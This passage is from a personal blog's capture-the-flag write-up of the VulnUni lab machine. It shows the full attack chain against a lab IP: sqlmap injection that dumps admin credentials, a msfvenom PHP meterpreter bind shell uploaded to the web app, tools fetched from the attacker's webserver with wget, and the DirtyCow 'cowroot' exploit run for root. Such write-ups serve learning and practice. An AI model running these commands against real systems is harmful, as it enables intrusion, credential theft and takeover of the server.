punctuation">(</span>VMware<span class="token punctuation">)</span></div><div class="highlight-line">Device type: general purpose</div><div class="highlight-line">Running: Linux <span class="token number">3</span>.X<span class="token operator">|</span><span class="token number">4</span>.X</div><div class="highlight-line">OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4</div><div class="highlight-line">OS details: Linux <span class="token number">3.2</span> – <span class="token number">4.9</span></div><div class="highlight-line">Network Distance: <span class="token number">1</span> hop</div><div class="highlight-line"></div><div class="highlight-line">TRACEROUTE</div><div class="highlight-line">HOP RTT     ADDRESS</div><div class="highlight-line"><span class="token number">1</span>   <span class="token number">0.77</span> ms <span class="token number">192.168</span>.8.132</div><div class="highlight-line"></div><div class="highlight-line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/</div></code></pre><br>#### Website Enumeration<p>With 80 being the only port open, I launched some basic website enumeration tools including dirbuster and OWASP Zap. Dirbuster was used to brute-force directories and OWASP Zap was used to scan for common vulnerabilities. While these were running in the background, I started some manual website inspection to get familiar with the site.</p><pre><code>root@kali$ dirbuster
+root@kali$ zaproxy
+</code></pre><p>Zaproxy did not find any major vulnerabilities, but it did have several interesting listings for under directory browsing (<a href="http://192.168.8.132/vulnuni-eclass/info/">http://192.168.8.132/vulnuni-eclass/info/</a>). These directories were not found by the dirbuster brute force search due to the unique nature of the application.</p><div class="row mt-3"><div class="col-sm mt-3 mt-md-0"><img class="img-fluid rounded z-depth-1" src="/assets/images/posts/2020-06-02-vulnuni-ctf-writeup/vulnuni2.png"></div></div><div class="caption">An OWASP Zaproxy session showing details of brute forced directories on the target server.</div><p>Navigating to the vulnuni subdirectory, some manual enumeration revealed the application was using version 1.7.2</p><div class="row mt-3"><div class="col-sm mt-3 mt-md-0"><img class="img-fluid rounded z-depth-1" src="/assets/images/posts/2020-06-02-vulnuni-ctf-writeup/vulnuni3.png"></div></div><div class="caption">The platform information page on the vulnuni-eclass web application.</div><p>A quick search through the exploit-db database with the searchsploit command revealed two public exploits for the application, both created by the CTF author. Using the -m options, I downloaded both exploits into the vs code workspace to inspect the vulnerabilities and prepare to use them against the target.</p><pre class="language-bash"><code class="language-bash"><div class="highlight-line">root@kali$ searchsploit GUnet </div><div class="highlight-line">——————————————- —————————————-</div><div class="highlight-line"> Exploit Title                             <span class="token operator">|</span>  Path</div><div class="highlight-line">                                           <span class="token operator">|</span> <span class="token punctuation">(</span>/usr/share/exploitdb/<span class="token punctuation">)</span></div><div class="highlight-line">——————————————- —————————————-</div><div class="highlight-line">GUnet OpenEclass <span class="token number">1.7</span>.3 E-learning platform <span class="token operator">|</span> exploits/php/webapps/48163.txt</div><div class="highlight-line">GUnet OpenEclass E-learning platform <span class="token number">1.7</span>.3 <span class="token operator">|</span> exploits/php/webapps/48106.txt</div><div class="highlight-line">——————————————- —————————————-</div><div class="highlight-line">Shellcodes: No Result</div><div class="highlight-line">root@kali$ searchsploit -m <span class="token number">48163</span></div><div class="highlight-line">root@kali$ searchsploit -m <span class="token number">48106</span></div></code></pre><br>#### SQL Injection<p>The exploit 48106 revealed a ‘uname’ SQL Injection vulnerability fo the GUnet OpenEclass E-learning platform 1.7.3. To exploit the vulnerability, I first needed to capture a failed log-in request on <a href="http://192.168.8.132/vulnuni-eclass/">http://192.168.8.132/vulnuni-eclass/</a> using burp-suite. I launched BurpSuite and configured my browser to handle http requests through a proxy at port 8080. I submitted a log in request using the username “admin” and the password “test”. BurpSuite captured the request, and I used the “send to repeater option” to save the request for editing.</p><div class="row mt-3"><div class="col-sm mt-3 mt-md-0"><img class="img-fluid rounded z-depth-1" src="/assets/images/posts/2020-06-02-vulnuni-ctf-writeup/vulnuni4.png"></div></div><div class="caption">A burpsuite capture showing a POST authentication request being sent to the target web server</div><p>At this point, I encountered a small hiccup. Whenever http requests were sent to the vulnuni web application, the hostname was being resolved as VulnUni.local instead of <a href="http://192.168.8.132">http://192.168.8.132</a>. This caused the http request to fail. To get around this issue, I needed to manually edit the burp-suite login capture to the ip address instead of the resolved hostname. Next, the exploit instructed me to download the intercepted http request as a file (eclasstestlogin) and load into SQL map with the following command.</p><pre class="language-bash"><code class="language-bash"><div class="highlight-line">root@kali$ sqlmap -r eclasstestlogin –level<span class="token operator">=</span><span class="token number">5</span> –risk<span class="token operator">=</span><span class="token number">3</span> -v</div></code></pre><div class="row mt-3"><div class="col-sm mt-3 mt-md-0"><img class="img-fluid rounded z-depth-1" src="/assets/images/posts/2020-06-02-vulnuni-ctf-writeup/vulnuni5.png"></div></div><div class="caption">SQLmap being run in a VSCode terminal</div><pre class="language-bash"><code class="language-bash"><div class="highlight-line">root@kali$ sqlmap -r eclasstestlogin -v –current-db</div><div class="highlight-line">root@kali$ sqlmap -r eclasstestlogin -v -D eclass –dump</div><div class="highlight-line">root@kali$ sqlmap -r eclasstestlogin -v -D eclass -T user –dump</div></code></pre><div class="row mt-3"><div class="col-sm mt-3 mt-md-0"><img class="img-fluid rounded z-depth-1" src="/assets/images/posts/2020-06-02-vulnuni-ctf-writeup/vulnuni6.png"></div></div><div class="caption">SQLmap being used to dump database tables</div><p>Now that I obtained admin credentials from sqlmap, I logged into the application as the administrator. Once again, the http request was being resolved to vulnuni.local. To actually log into the application, I edited the raw request in burp-suite as shown below. After hitting send, I selected the Render” tab on the response, then right clicked and selected to open up in browser.</p><div class="row mt-3"><div class="col-sm mt-3 mt-md-0"><img class="img-fluid rounded z-depth-1" src="/assets/images/posts/2020-06-02-vulnuni-ctf-writeup/vulnuni7.png"></div></div><div class="caption">A burpsuite repeater session using the dumped credentials to log into the application as admin</div><p>Next, I navigated over to the other exploit identified earlier in the exploit-db. This exploit titled “GUnet OpenEclass 1.7.3 E-learning platform – ‘month’ SQL Injection” enables authenticated admins to upload reverse php shell files. To exploit this vulnerability, I used msfvenom to create a php meterpreter bind shell on port 4448.</p><pre class="language-bash"><code class="language-bash"><div class="highlight-line">root@kali$ msfvenom -p php/meterpreter/bind_tcp <span class="token assign-left variable">LHOST</span><span class="token operator">=</span><span class="token number">192.168</span>.8.130 <span class="token assign-left variable">LPORT</span><span class="token operator">=</span><span class="token number">4448</span> R <span class="token operator">></span> bind-meterpreter.php</div><div class="highlight-line"><span class="token punctuation">[</span>-<span class="token punctuation">]</span> No platform was selected, choosing Msf::Module::Platform::PHP from the payload</div><div class="highlight-line"><span class="token punctuation">[</span>-<span class="token punctuation">]</span> No arch selected, selecting arch: php from the payload</div><div class="highlight-line">No encoder or badchars specified, outputting raw payload</div><div class="highlight-line">Payload size: <span class="token number">1338</span> bytes</div></code></pre><p>Before the exploit could be uploaded to the application, it needed to be zipped and compressed. Once zipped, I uploaded it to the vulnuni webserver.</p><pre class="language-bash"><code class="language-bash"><div class="highlight-line">root@kali$ <span class="token function">zip</span> bind-meterpreter bind-meterpreter.php </div><div class="highlight-line">  adding: bind-meterpreter.php <span class="token punctuation">(</span>deflated <span class="token number">62</span>%<span class="token punctuation">)</span></div></code></pre><br>#### Target Infiltration<p>With the exploit ready, I started a metasploit session and opened a multi/handler to connect to the bind shell.</p><pre class="language-bash"><code class="language-bash"><div class="highlight-line">root@kali$ msfconsole</div><div class="highlight-line"></div><div class="highlight-line">msf5 <span class="token operator">></span> use multi/handler</div><div class="highlight-line">msf5 exploit<span class="token punctuation">(</span>multi/handler<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token builtin class-name">set</span> LHOST <span class="token number">192.168</span>.8.130</div><div class="highlight-line">LHOST <span class="token operator">=</span><span class="token operator">></span> <span class="token number">192.168</span>.8.130</div><div class="highlight-line">msf5 exploit<span class="token punctuation">(</span>multi/handler<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token builtin class-name">set</span> RHOST <span class="token number">192.168</span>.8.132</div><div class="highlight-line">RHOST <span class="token operator">=</span><span class="token operator">></span> <span class="token number">192.168</span>.8.132</div><div class="highlight-line">msf5 exploit<span class="token punctuation">(</span>multi/handler<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token builtin class-name">set</span> LPORT <span class="token number">4448</span></div><div class="highlight-line">LPORT <span class="token operator">=</span><span class="token operator">></span> <span class="token number">4448</span></div><div class="highlight-line">msf5 exploit<span class="token punctuation">(</span>multi/handler<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token builtin class-name">set</span> payload php/meterpreter/bind_tcp</div><div class="highlight-line">payload <span class="token operator">=</span><span class="token operator">></span> php/meterpreter/bind_tcp</div></code></pre><p>I set the necessary LPORT, LHOST, RHOST, and payload options. Before I launched the handler, I browsed the payload on the target website to initiate the bind shell. Once the payload loaded, I ran the handler and received the shell.</p><pre class="language-bash"><code class="language-bash"><div class="highlight-line">root@kali$ msf5 <span class="token operator">></span></div><div class="highlight-line"></div><div class="highlight-line">msf5 exploit<span class="token punctuation">(</span>multi/handler<span class="token punctuation">)</span> <span class="token operator">></span> run</div><div class="highlight-line"></div><div class="highlight-line"><span class="token punctuation">[</span>*<span class="token punctuation">]</span> Started <span class="token builtin class-name">bind</span> TCP handler against <span class="token number">192.168</span>.8.132:4448</div><div class="highlight-line"><span class="token punctuation">[</span>*<span class="token punctuation">]</span> Sending stage <span class="token punctuation">(</span><span class="token number">38288</span> bytes<span class="token punctuation">)</span> to <span class="token number">192.168</span>.8.132</div><div class="highlight-line"><span class="token punctuation">[</span>*<span class="token punctuation">]</span> Meterpreter session <span class="token number">1</span> opened <span class="token punctuation">(</span><span class="token number">0.0</span>.0.0:0 -<span class="token operator">></span> <span class="token number">192.168</span>.8.132:4448<span class="token punctuation">)</span> at <span class="token number">2020</span>-05-12 00:43:47 -0400</div></code></pre><div class="row mt-3"><div class="col-sm mt-3 mt-md-0"><img class="img-fluid rounded z-depth-1" src="/assets/images/posts/2020-06-02-vulnuni-ctf-writeup/vulnuni8.png"></div></div><div class="caption">Receiving a shell on the metasploit multi/handler</div><p>I spent some time running through meterpreter enumeration scripts to gather more details on the target. Once I gathered enough information, I dropped into a shell to run some linux privilege escalations scripts. Using the shell command, I dropped into a low interactive shell. To upgrade, I ran the following exports and used a simple python script to open up a bash shell.</p><pre class="language-bash"><code class="language-bash"><div class="highlight-line">root@kali$ meterpreter <span class="token operator">></span> shell</div><div class="highlight-line">Process <span class="token number">2181</span> created.</div><div class="highlight-line">Channel <span class="token number">1</span> created.</div><div class="highlight-line"><span class="token builtin class-name">export</span> <span class="token assign-left variable"><span class="token environment constant">TERM</span></span><span class="token operator">=</span>xterm</div><div class="highlight-line"><span class="token builtin class-name">export</span> <span class="token assign-left variable"><span class="token environment constant">SHELL</span></span><span class="token operator">=</span>bash</div><div class="highlight-line"><span class="token builtin class-name">export</span> <span class="token assign-left variable"><span class="token environment constant">PATH</span></span><span class="token operator">=</span>/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin</div><div class="highlight-line">python -c ‘import pty<span class="token punctuation">;</span>pty.spawn<span class="token punctuation">(</span>“/bin/bash”<span class="token punctuation">)</span>’</div><div class="highlight-line">www-data@vulnuni:/root@kali$</div></code></pre><p>With a better shell, I did some manual navigating on the target and came across a flag in the vulnuni/home directory.</p><pre class="language-bash"><code class="language-bash"><div class="highlight-line">www-data@vulnuni$ <span class="token function">ls</span></div><div class="highlight-line"><span class="token function">ls</span></div><div class="highlight-line">Desktop    Downloads  Pictures  Templates  examples.desktop</div><div class="highlight-line">Documents  Music      Public    Videos     flag.txt</div><div class="highlight-line">www-data@vulnuni:/home/vulnuniwww-data@vulnuni$ <span class="token function">cat</span> flag.txt</div><div class="highlight-line"><span class="token function">cat</span> flag.txt</div><div class="highlight-line">68fc668278d9b0d6c3b9dc100bee181e</div></code></pre><p>Next, I opened up a webserver on my Kali linux machine to easily transfer some privilege escalation scripts to the target. I copied these scripts from my redteam-apache-toolkit project to my webserver at /var/www/html . I used wget on the target to transfer the scripts into the /tmp folder. One of the privilege escalation/ enumeration scripts I ran was BeRoot. The output showed that this target was vulnerable to the dirty cow linux kernel privilege escalation exploit.</p><div class="row mt-3"><div class="col-sm mt-3 mt-md-0"><img class="img-fluid rounded z-depth-1" src="/assets/images/posts/2020-06-02-vulnuni-ctf-writeup/vulnuni9.png"></div></div><div class="caption">The output of the BeRoot exploit suggestion script</div><p>There are several dirty cow exploits available, each one uses a slightly different method of triggering the exploit. The GitHub wiki pages includes a list of POC’s. I tried a few of these however running the exploit caused the target VM to crash, a common problem experienced when using dirty cow. The best option I found was to use the SUID-based root exploit cowroot. I copied the POC to my machine, compiled it with gcc, and then transferred it to the target with wget.</p><pre class="language-bash"><code class="language-bash"><div class="highlight-line">root@kali$ root@kali:~/Desktop<span class="token comment"># gcc -pthread cowroot.c -o cowroot </span></div></code></pre><p>With the exploit on the target machine, I made it executable with chmod and executed it. The dirty cow exploit upgraded my limited www-data shell to a full root shell. I quickly read the flag in the root directory with cat.</p><pre class="language-bash"><code class="language-bash"><div class="highlight-line">root@kali$ msf <span class="token operator">></span></div><div class="highlight-line">meterpreter <span class="token operator">></span> shell</div><div class="highlight-line">Process <span class="token number">2241</span> created.</div><div class="highlight-line">Channel <span class="token number">0</span> created.</div><div class="highlight-line"><span class="token builtin class-name">export</span> <span class="token assign-left variable"><span class="token environment constant">TERM</span></span><span class="token operator">=</span>xterm</div><div class="highlight-line"><span class="token builtin class-name">export</span> <span class="token assign-left variable"><span class="token environment constant">SHELL</span></span><span class="token operator">=</span>bash</div><div class="highlight-line"><span class="token builtin class-name">export</span> <span class="token assign-left variable"><span class="token environment constant">PATH</span></span><span class="token operator">=</span>/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin</div><div class="highlight-line">python -c ‘import pty<span class="token punctuation">;</span>pty.spawn<span class="token punctuation">(</span>“/bin/bash”<span class="token punctuation">)</span>’</div><div class="highlight-line">www-data@vulnuni:/var/www/vulnuni-eclass/courses/tmpUnzippingroot@kali$ ./cowroot</div><div class="highlight-line">./cowroot</div><div class="highlight-line">DirtyCow root privilege escalation</div><div class="highlight-line">Backing up /usr/bin/passwd to /tmp/bak</div><div class="highlight-line">Size of binary: <span class="token number">42824</span></div><div class="highlight-line">Racing, this may take a while<span class="token punctuation">..</span></div><div class="highlight-line">/usr/bin/passwd overwritten</div><div class="highlight-line">Popping root shell.</div><div class="highlight-line">Don’t forget to restore /tmp/bak</div><div class="highlight-line">thread stopped</div><div class="highlight-line">thread stopped</div><div class="highlight-line">root@vulnuni:/var/www/vulnuni-eclass/courses/tmpUnzipping<span class="token comment"># cat /root/flag.txt</span></div><div class="highlight-line"><span class="token function">cat</span> /root/flag.txt</div><div class="highlight-line">ff19f8d0692fe20f8af33a3bfa6635dd</div><div class="highlight-line">root@vulnuni:/var/www/vulnuni-eclass/courses/tmpUnzipping<span class="token comment"># whoami</span></div><div class="highlight-line"><span class="token function">whoami</span></div><div class="highlight-line">root</div><div class="highlight-line">root@vulnuni:/var/www/vulnuni-eclass/courses/tmpUnzipping<span class="token comment"># id</span></div><div class="highlight-line"><span class="token function">id</span></div><div class="highlight-line"><span class="token assign-left variable">uid</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span> <span class="token assign-left variable">gid</span><span class="token operator">=</span><span class="token number">33</span><span class="token punctuation">(</span>www-data<span class="token punctuation">)</span> <span class="token assign-left variable">groups</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span>,33<span class="token punctuation">(</span>www-data<span class="token punctuation">)</span></div><div class="highlight-line">root@vulnuni:/var/www/vulnuni-eclass/courses/tmpUnzipping<span class="token comment">#</span></div></code></pre><div class="row mt-3"><div class="col-sm mt-3 mt-md-0"><img class="img-fluid rounded z-depth-1" src="/assets/images/posts/2020-06-02-vulnuni-ctf-writeup/vulnuni10.png"></div></div><div class="caption">Reading the final flag with root permission</div><p>Overall this was a good CTF challenge and taught me a little more about linux kernel privilege escalation exploits. Not all dirty cow exploits are the same, and many can cause virtual linux machines to crash. Additionally, the authors personal infosec posts is a good read and can be found at <a href="https://emaragkos.gr">https://emaragkos.gr</a>.</p></div><div class="c-share"><span>Share on</span><ul class="c-share__list"><li class="c-share__list-item"><a href="https://twitter.com/intent/tweet/?text=VulnUni%20CTF%20Writeup&amp;url=https%3A%2F%2Ftbutler.org%2Fposts%2F2020%2F06%2Fvulnuni-ctf-writeup%2F" aria-label="Twitter" class="c-share__list-anchor"><svg focusable="false" aria-hidden="true" width="24" height="24" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path fill="currentColor" d="M23.954 4.569a10 10 0 0 1-2.825.775 4.958 4.958 0 0 0 2.163-2.723c-.951.555-2.005.959-3.127 1.184a4.92 4.92 0 0 0-8.384 4.482C7.691 8.094 4.066 6.13 1.64 3.161a4.822 4.822 0 0 0-.666 2.475c0 1.71.87 3.213 2.188 4.096a4.904 4.904 0 0 1-2.228-.616v.061a4.923 4.923 0 0 0 3.946 4.827 4.996 4.996 0 0 1-2.212.085 4.937 4.937 0 0 0 4.604 3.417 9.868 9.868 0 0 1-6.102 2.105c-.39 0-.779-.023-1.17-.067a13.995 13.995 0 0 0 7.557 2.209c9.054 0 13.999-7.496 13.999-13.986 0-.209 0-.42-.015-.63a9.936 9.936 0 0 0 2.46-2.548l-.047-.02z"></path></svg></a></li><li class="c-share__list-item"><a href="https://facebook.com/sharer/sharer.php?u=https%3A%2F%2Ftbutler.org%2Fposts%2F2020%2F06%2Fvulnuni-ctf-writeup%2F" aria-label="Facebook" class="c-share__list-anchor"><svg focusable="false" aria-hidden="true" width="24" height="24" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path fill="currentColor" d="M23.9981 11.9991C23.9981 5.37216 18.626 0 11.9991 0C5.37216 0 0 5.37216 0 11.9991C0 17.9882 4.38789 22.9522 10.1242 23.8524V15.4676H7.07758V11.9991H10.1242V9.35553C10.1242 6.34826 11.9156 4.68714 14.6564 4.68714C15.9692 4.68714 17.3424 4.92149 17.3424 4.92149V7.87439H15.8294C14.3388 7.87439 13.8739 8.79933 13.8739 9.74824V11.9991H17.2018L16.6698 15.4676H13.8739V23.8524C19.6103 22.9522 23.9981 17.9882 23.9981 11.9991Z"/></svg></a></li></ul></div></article></main><footer class="c-contentinfo" role="contentinfo"><ul class="c-contentinfo__list"><li class="c-contentinfo__list-item"><a class="c-contentinfo__list-anchor" href="/work/">Work</a></li><li class="c-contentinfo__list-item"><a class="c-contentinfo__list-anchor" href="/posts/">Posts</a></li><li class="c-contentinfo__list-item"><a class="c-contentinfo__list-anchor" href="/contact/">Contact</a></li></ul><ul class="c-contentinfo__list"><li class="c-contentinfo__list-item"><a class="c-contentinfo__list-anchor" rel="me" aria-label="Twitter" href="https://twitter.com/tbutler0x90"><svg focusable="false" aria-hidden="true" width="24" height="24" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path fill="currentColor" d="M23.954 4.569a10 10 0 0 1-2.825.775 4.958 4.958 0 0 0 2.163-2.723c-.951.555-2.005.959-3.127 1.184a4.92 4.92 0 0 0-8.384 4.482C7.691 8.094 4.066 6.13 1.64 3.161a4.822 4.822 0 0 0-.666 2.475c0 1.71.87 3.213 2.188 4.096a4.904 4.904 0 0 1-2.228-.616v.061a4.923 4.923 0 0 0 3.946 4.827 4.996 4.996 0 0 1-2.212.085 4.937 4.937 0 0 0 4.604 3.417 9.868 9.868 0 0 1-6.102 2.105c-.39 0-.779-.023-1.17-.067a13.995 13.995 0 0 0 7.557 2.209c9.054 0 13.999-7.496 13.999-13.986 0-.209 0-.42-.015-.63a9.936 9.936 0 0 0 2.46-2.548l-.047-.02z"></path></svg></a></li><li class="c-contentinfo__list-item"><a class="c-contentinfo__list-anchor" rel="me" aria-label="Github" href="https://github.com/tcbutler320"><svg focusable="false" aria-hidden="true" width="24" height="24" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path fill="currentColor" d="M12 .297c-6.63 0-12 5.373-12 12 0 5.303 3.438 9.8 8.205 11.385.6.113.82-.258.82-.577 0-.285-.01-1.04-.015-2.04-3.338.724-4.042-1.61-4.042-1.61C4.422 18.07 3.633 17.7 3.633 17.7c-1.087-.744.084-.729.084-.729 1.205.084 1.838 1.236 1.838 1.236 1.07 1.835 2.809 1.305 3.495.998.108-.776.417-1.305.76-1.605-2.665-.3-5.466-1.332-5.466-5.93 0-1.31.465-2.38 1.235-3.22-.135-.303-.54-1.523.105-3.176 0 0 1.005-.322 3.3 1.23.96-.267 1.98-.399 3-.405 1.02.006 2.04.138 3 .405 2.28-1.552 3.285-1.23 3.285-1.23.645 1.653.24 2.873.12 3.176.765.84 1.23 1.91 1.23 3.22 0 4.61-2.805 5.625-5.475 5.92.42.36.81 1.096.81 2.22 0 1.606-.015 2.896-.015 3.286 0 .315.21.69.825.57C20.565 22.092 24 17.592 24 12.297c0-6.627-5.373-12-12-12"></path></svg></a></li><li class="c-contentinfo__list-item"><a class="c-contentinfo__list-anchor" rel="me" aria-label="Linkedin" href="https://www.linkedin.com/in/tyler-b-a700a1aa"><svg focusable="false" aria-hidden="true" width="24" height="24" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path fill="currentColor" d="M20.447 20.452h-3.554v-5.569c0-1.328-.027-3.037-1.852-3.037-1.853 0-2.136 1.445-2.136 2.939v5.667H9.351V9h3.414v1.561h.046c.477-.9 1.637-1.85 3.37-1.85 3.601 0 4.267 2.37 4.267 5.455v6.286zM5.337 7.433c-1.144 0-2.063-.926-2.063-2.065 0-1.138.92-2.063 2.063-2.063 1.14 0 2.064.925 2.064 2.063 0 1.139-.925 2.065-2.064 2.065zm1.782 13.019H3.555V9h3.564v11.452zM22.225 0H1.771C.792 0 0 .774 0 1.729v20.542C0 23.227.792 24 1.771 24h20.451C23.2 24 24 23.227 24 22.271V1.729C24 .774 23.2 0 22.222 0h.003z"></path></svg></a></li></ul></footer><script src="//instant.page/5.0.1" type="module" integrity="sha384-0DvoZ9kNcB36fWcQApIMIGQoTzoBDYTQ85e8nmsfFOGz4RHAdUhADqJt4k3K2uLS"></script></body></html>
